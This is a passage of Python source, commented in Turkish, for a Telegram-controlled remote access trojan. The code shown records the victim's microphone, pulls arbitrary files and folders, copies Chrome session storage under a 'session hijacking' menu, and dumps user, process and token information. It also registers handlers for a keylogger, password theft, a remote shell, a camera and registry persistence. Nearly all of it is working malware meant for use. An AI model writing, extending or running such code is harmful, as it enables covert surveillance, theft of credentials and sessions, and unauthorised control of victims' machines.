            data = stream.read(CHUNK)
            frames.append(data)
        
        # Kayıt durdur
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        # WAV dosyası oluştur
        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        # Dosyayı gönder
        await context.bot.send_audio(
            chat_id=update.effective_chat.id,
            audio=open(filename, 'rb'),
            caption=f"🎙️ **Mikrofon Kaydı Tamamlandı**\n\n⏱️ Süre: {duration} saniye\n📁 Dosya: {filename}"
        )
        
        # Dosyayı sil
        import os
        os.remove(filename)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="✅ **Mikrofon kaydı başarıyla tamamlandı ve dosya silindi!**"
        )
        
    except ImportError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ **Mikrofon kayıt hatası:**\n\n`pyaudio` kütüphanesi bulunamadı!\n\nKurulum: `pip install pyaudio`"
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ **Mikrofon kayıt hatası:**\n\n{e}"
        )

# Dosya çekme menüsü
async def download_file_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Dosya çekme menüsü"""
    # Yetki kontrolü
    if update.effective_user.id not in ALLOWED_USERS:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Yetkiniz yok!")
        return
    
    try:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="📥 **DOSYA/KLASÖR ÇEKME**\n\n"
                 "Dosya veya klasör yolunu yazın:\n\n"
                 "**Örnekler:**\n"
                 "• `C:\\Users\\Kullanici\\Desktop\\dosya.txt`\n"
                 "• `C:\\Users\\Kullanici\\Documents\\klasor`\n"
                 "• `C:\\Windows\\System32\\notepad.exe`\n\n"
                 "**Kullanım:**\n"
                 "`/download <dosya_yolu>`\n\n"
                 "**Örnek:**\n"
                 "`/download C:\\Users\\Kullanici\\Desktop\\test.txt`"
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Dosya çekme menü hatası: {e}"
        )

# Dosya çekme komutu
async def download_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Dosya veya klasörü çeker"""
    # Yetki kontrolü
    if update.effective_user.id not in ALLOWED_USERS:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Yetkiniz yok!")
        return
    
    try:
        # Komut argümanlarını al
        if not context.args:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ **Kullanım:** `/download <dosya_yolu>`\n\n"
                     "**Örnek:** `/download C:\\Users\\Kullanici\\Desktop\\test.txt`"
            )
            return
        
        file_path = " ".join(context.args)
        
        # Dosya/klasör varlığını kontrol et
        if not os.path.exists(file_path):
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ **Dosya/Klasör bulunamadı:**\n`{file_path}`"
            )
            return
        
        # Dosya mı klasör mü kontrol et
        if os.path.isfile(file_path):
            await download_single_file(update, context, file_path)
        elif os.path.isdir(file_path):
            await download_folder(update, context, file_path)
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ **Geçersiz dosya türü:**\n`{file_path}`"
            )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ **Dosya çekme hatası:**\n\n{e}"
        )

# Tek dosya çekme
async def download_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str):
    """Tek dosyayı çeker"""
    try:
        import shutil
        
        # Dosya boyutunu kontrol et (50MB limit)
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:  # 50MB
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ **Dosya çok büyük:**\n\n"
                     f"📁 Dosya: `{file_path}`\n"
                     f"📊 Boyut: {file_size / (1024*1024):.1f} MB\n"
                     f"⚠️ Limit: 50 MB"
            )
            return
        
        # Dosya adını al
        filename = os.path.basename(file_path)
        
        # Kullanıcıya bilgi ver
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"📥 **Dosya çekiliyor...**\n\n"
                 f"📁 Dosya: `{file_path}`\n"
                 f"📊 Boyut: {file_size / 1024:.1f} KB"
        )
        
        # Dosyayı gönder
        with open(file_path, 'rb') as file:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file,
                filename=filename,
                caption=f"📥 **Dosya Çekildi**\n\n"
                        f"📁 Dosya: `{file_path}`\n"
                        f"📊 Boyut: {file_size / 1024:.1f} KB"
            )
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="✅ **Dosya başarıyla çekildi!**"
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ **Dosya çekme hatası:**\n\n{e}"
        )

# Klasör çekme (ZIP olarak)
async def download_folder(update: Update, context: ContextTypes.DEFAULT_TYPE, folder_path: str):
    """Klasörü ZIP olarak çeker"""
    try:
        import zipfile
        import tempfile
        import time
        
        # Klasör adını al
        folder_name = os.path.basename(folder_path)
        zip_filename = f"{folder_name}_{int(time.time())}.zip"
        
        # Kullanıcıya bilgi ver
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"📁 **Klasör ZIP'leniyor...**\n\n"
                 f"📂 Klasör: `{folder_path}`\n"
                 f"📦 ZIP: `{zip_filename}`"
        )
        
        # Geçici ZIP dosyası oluştur
        with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
            temp_zip_path = temp_zip.name
        
        # ZIP oluştur
        with zipfile.ZipFile(temp_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, arcname)
        
        # ZIP boyutunu kontrol et
        zip_size = os.path.getsize(temp_zip_path)
        if zip_size > 50 * 1024 * 1024:  # 50MB
            os.remove(temp_zip_path)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ **ZIP çok büyük:**\n\n"
                     f"📂 Klasör: `{folder_path}`\n"
                     f"📊 Boyut: {zip_size / (1024*1024):.1f} MB\n"
                     f"⚠️ Limit: 50 MB"
            )
            return
        
        # ZIP'i gönder
        with open(temp_zip_path, 'rb') as zip_file:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=zip_file,
                filename=zip_filename,
                caption=f"📁 **Klasör ZIP'lendi**\n\n"
                        f"📂 Klasör: `{folder_path}`\n"
                        f"📦 ZIP: `{zip_filename}`\n"
                        f"📊 Boyut: {zip_size / 1024:.1f} KB"
            )
        
        # Geçici dosyayı sil
        os.remove(temp_zip_path)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="✅ **Klasör başarıyla ZIP'lendi ve çekildi!**"
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ **Klasör çekme hatası:**\n\n{e}"
        )

# Session Hijacking fonksiyonu
async def session_hijacking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Session hijacking özelliği"""
    # Yetki kontrolü
    if update.effective_user.id not in ALLOWED_USERS:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Yetkiniz yok!")
        return
    
    try:
        # Session hijacking menüsü
        keyboard = [
            [
                InlineKeyboardButton("🌐 Tarayıcı Session'ları", callback_data="session_browser"),
                InlineKeyboardButton("🔐 Windows Session'ları", callback_data="session_windows")
            ],
            [
                InlineKeyboardButton("📱 Uygulama Session'ları", callback_data="session_apps"),
                InlineKeyboardButton("🔑 Token Çalma", callback_data="session_tokens")
            ],
            [
                InlineKeyboardButton("🔙 Geri", callback_data="back_to_main")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="🔓 **SESSION HIJACKING**\n\n"
                 "Hedef sistemdeki aktif oturumları ele geçirin:\n\n"
                 "**Mevcut Özellikler:**\n"
                 "🌐 **Tarayıcı Session'ları** - Chrome, Firefox, Edge\n"
                 "🔐 **Windows Session'ları** - Sistem oturumları\n"
                 "📱 **Uygulama Session'ları** - Uygulama token'ları\n"
                 "🔑 **Token Çalma** - API ve auth token'ları",
            reply_markup=reply_markup
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Session hijacking menü hatası: {e}"
        )

# Session hijacking callback handler
async def session_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Session hijacking callback'lerini işler"""
    # Yetki kontrolü
    if update.effective_user.id not in ALLOWED_USERS:
        try:
            await update.callback_query.answer("❌ Yetkiniz yok!")
        except:
            pass
        return
    
    query = update.callback_query
    
    try:
        await query.answer()
    except Exception:
        # Query çok eski, devam et
        pass
    
    try:
        data = query.data
        
        if data == "session_browser":
            await hijack_browser_sessions(update, context)
        elif data == "session_windows":
            await hijack_windows_sessions(update, context)
        elif data == "session_apps":
            await hijack_app_sessions(update, context)
        elif data == "session_tokens":
            await steal_tokens(update, context)
        elif data == "back_to_main":
            await start(update, context)
        
    except Exception as e:
        try:
            await query.edit_message_text(text=f"Session callback hatası: {e}")
        except:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"Session callback hatası: {e}"
            )

# Tarayıcı session'larını çal
async def hijack_browser_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Tarayıcı session'larını çalar"""
    try:
        import json
        import sqlite3
        import shutil
        import os
        
        # Chrome session'ları
        chrome_sessions = []
        chrome_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Session Storage")
        
        if os.path.exists(chrome_path):
            try:
                # Chrome session dosyalarını kopyala
                temp_dir = "temp_chrome_sessions"
                if not os.path.exists(temp_dir):
                    os.makedirs(temp_dir)
                
                for file in os.listdir(chrome_path):
                    if file.endswith('.log'):
                        shutil.copy2(os.path.join(chrome_path, file), temp_dir)
                        chrome_sessions.append(file)
                
                if chrome_sessions:
                    # Session dosyalarını ZIP'le
                    import zipfile
                    import time
                    zip_filename = f"chrome_sessions_{int(time.time())}.zip"
                    
                    with zipfile.ZipFile(zip_filename, 'w') as zipf:
                        for file in chrome_sessions:
                            zipf.write(os.path.join(temp_dir, file), file)
                    
                    # ZIP'i gönder
                    with open(zip_filename, 'rb') as zip_file:
                        await context.bot.send_document(
                            chat_id=update.effective_chat.id,
                            document=zip_file,
                            filename=zip_filename,
                            caption="🌐 **Chrome Session'ları Çalındı**\n\n"
                                   f"📁 Dosya sayısı: {len(chrome_sessions)}\n"
                                   f"📦 ZIP: {zip_filename}"
                        )
                    
                    # Temizlik
                    os.remove(zip_filename)
                    shutil.rmtree(temp_dir)
                else:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text="🌐 **Chrome Session'ları**\n\n❌ Session dosyası bulunamadı!"
                    )
                    
            except Exception as e:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🌐 **Chrome Session Hatası:**\n\n{e}"
                )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="🌐 **Chrome Session'ları**\n\n❌ Chrome yüklü değil!"
            )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ **Tarayıcı session hatası:**\n\n{e}"
        )

# Windows session'larını çal
async def hijack_windows_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Windows session'larını çalar"""
    try:
        import subprocess
        
        # Aktif kullanıcıları listele
        result = subprocess.run(['query', 'user'], capture_output=True, text=True, shell=True, encoding='utf-8', errors='ignore')
        
        if result.returncode == 0 and result.stdout:
            users = result.stdout
            
            # Session bilgilerini al
            session_info = f"🔐 **Windows Session'ları**\n\n"
            session_info += f"```\n{users}\n```\n"
            
            # Ek bilgiler
            session_info += "**Aktif Session'lar:**\n"
            session_info += "• Konsol oturumları\n"
            session_info += "• RDP bağlantıları\n"
            session_info += "• Terminal servisleri\n"
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=session_info
            )
        else:
            # Alternatif komut dene
            result2 = subprocess.run(['whoami'], capture_output=True, text=True, shell=True, encoding='utf-8', errors='ignore')
            if result2.returncode == 0:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🔐 **Windows Session'ları**\n\n**Mevcut Kullanıcı:**\n```\n{result2.stdout}\n```\n\n❌ Detaylı session bilgileri alınamadı!"
                )
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="🔐 **Windows Session'ları**\n\n❌ Session bilgileri alınamadı!"
                )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ **Windows session hatası:**\n\n{e}"
        )

# Uygulama session'larını çal
async def hijack_app_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Uygulama session'larını çalar"""
    try:
        import subprocess
        
        # Çalışan uygulamaları listele
        result = subprocess.run(['tasklist', '/v'], capture_output=True, text=True, shell=True, encoding='utf-8', errors='ignore')
        
        if result.returncode == 0 and result.stdout:
            processes = result.stdout
            
            # Session bilgilerini al
            session_info = f"📱 **Uygulama Session'ları**\n\n"
            session_info += f"```\n{processes[:1000]}...\n```\n"
            
            # Ek bilgiler
            session_info += "**Aktif Uygulamalar:**\n"
            session_info += "• Sistem süreçleri\n"
            session_info += "• Kullanıcı uygulamaları\n"
            session_info += "• Servis süreçleri\n"
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=session_info
            )
        else:
            # Alternatif komut dene
            result2 = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True, encoding='utf-8', errors='ignore')
            if result2.returncode == 0 and result2.stdout:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"📱 **Uygulama Session'ları**\n\n**Basit Süreç Listesi:**\n```\n{result2.stdout[:1000]}...\n```\n\n❌ Detaylı bilgiler alınamadı!"
                )
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="📱 **Uygulama Session'ları**\n\n❌ Uygulama bilgileri alınamadı!"
                )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ **Uygulama session hatası:**\n\n{e}"
        )

# Token'ları çal
async def steal_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Token'ları çalar"""
    try:
        import subprocess
        
        # Windows token'larını al
        result = subprocess.run(['whoami', '/all'], capture_output=True, text=True, shell=True, encoding='utf-8', errors='ignore')
        
        if result.returncode == 0 and result.stdout:
            tokens = result.stdout
            
            # Token bilgilerini al (ilk 2000 karakter)
            token_info = f"🔑 **Token Bilgileri**\n\n"
            token_info += f"```\n{tokens[:2000]}...\n```\n"
            
            # Ek bilgiler
            token_info += "**Çalınan Token'lar:**\n"
            token_info += "• Kullanıcı token'ları\n"
            token_info += "• Grup token'ları\n"
            token_info += "• Privilege token'ları\n"
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=token_info
            )
        else:
            # Alternatif komut dene
            result2 = subprocess.run(['whoami'], capture_output=True, text=True, shell=True, encoding='utf-8', errors='ignore')
            if result2.returncode == 0 and result2.stdout:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🔑 **Token Bilgileri**\n\n**Mevcut Kullanıcı:**\n```\n{result2.stdout}\n```\n\n❌ Detaylı token bilgileri alınamadı!"
                )
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="🔑 **Token Çalma**\n\n❌ Token bilgileri alınamadı!"
                )
            
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ **Token çalma hatası:**\n\n{e}"
        )

# Telegram botu yapılandırması
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Komutları ekle
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ekranss", ekran_goruntusu))
    application.add_handler(CommandHandler("log", send_log))
    application.add_handler(CommandHandler("video", send_video))
    application.add_handler(CommandHandler("start_video", start_video))
    application.add_handler(CommandHandler("stop_video", stop_video))
    application.add_handler(CommandHandler("shutdown", shutdown))
    application.add_handler(CommandHandler("restart", restart))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(CommandHandler("kamera", kamera))
    application.add_handler(CommandHandler("system", system_info))
    application.add_handler(CommandHandler("processes", processes))
    application.add_handler(CommandHandler("files", list_files))
    application.add_handler(CommandHandler("start_keylogger", start_keylogger_cmd))
    application.add_handler(CommandHandler("stop_keylogger", stop_keylogger_cmd))
    application.add_handler(CommandHandler("run", run_app))
    application.add_handler(CommandHandler("delete", delete_file))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("passwords", steal_passwords))
    application.add_handler(CommandHandler("bypass", bypass_passwords))
    application.add_handler(CommandHandler("shell", shell_cmd))
    application.add_handler(CommandHandler("shellinfo", shell_info))
    application.add_handler(CommandHandler("shellhistory", shell_history))
    application.add_handler(CommandHandler("shellcommands", shell_commands))
    application.add_handler(CommandHandler("download", download_file))
    application.add_handler(CommandHandler("persistence", check_persistence))
    application.add_handler(CallbackQueryHandler(shell_callback, pattern="^shell_|^cmd_"))
    application.add_handler(CallbackQueryHandler(rat_callback, pattern="^rat_"))
    application.add_handler(CallbackQueryHandler(microphone_callback, pattern="^mic_|^back_"))
    application.add_handler(CallbackQueryHandler(session_callback, pattern="^session_|^back_"))
    

    # Telegram botunu çalıştır
    application.run_polling()

if __name__ == "__main__":
    add_to_startup()  # Kayıt defterine ekleyin
    main()
